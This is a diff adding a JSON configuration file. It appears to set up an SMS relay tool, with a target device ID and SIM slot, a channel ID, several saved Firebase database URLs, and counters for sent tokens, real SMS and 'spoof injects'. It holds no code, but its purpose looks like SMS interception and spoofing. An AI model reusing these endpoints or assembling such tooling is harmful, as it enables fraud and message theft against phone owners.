@@ -1,0 +1,32 @@
+{
+  "user_id": "8414144162",
+  "license_key": "",
+  "firebase_url": "https://negor-72c04-default-rtdb.asia-southeast1.firebasedatabase.app",
+  "auth_key": "https://negor-72c04-default-rtdb.asia-southeast1.firebasedatabase.app",
+  "selected_device_id": "241feae52f8ff710",
+  "selected_sim_slot": 1,
+  "channel_id": "-1003828037384",
+  "is_polling_active": false,
+  "last_timestamp": 0,
+  "last_updated": "2026-10-20T04:17:31.437329+00:00",
+  "stats_tokens_sent": 0,
+  "stats_real_sms": 0,
+  "stats_spoof_injects": 0,
+  "ignore_initial_messages": true,
+  "saved_firebases": [
+    {
+      "url": "https://vijay-4-default-rtdb.firebaseio.com",
+      "auth": "https://vijay-4-default-rtdb.firebaseio.com"
+    },
+    {
+      "url": "https://rajuu-6d6a9-default-rtdb.firebaseio.com",
+      "auth": "https://rajuu-6d6a9-default-rtdb.firebaseio.com"
+    },
+    {
+      "url": "https://negor-72c04-default-rtdb.asia-southeast1.firebasedatabase.app",
+      "auth": "https://negor-72c04-default-rtdb.asia-southeast1.firebasedatabase.app"
+    }
+  ],
+  "last_message_id": 0,
+  "monitor_start_time": 1792438575.975254
+}
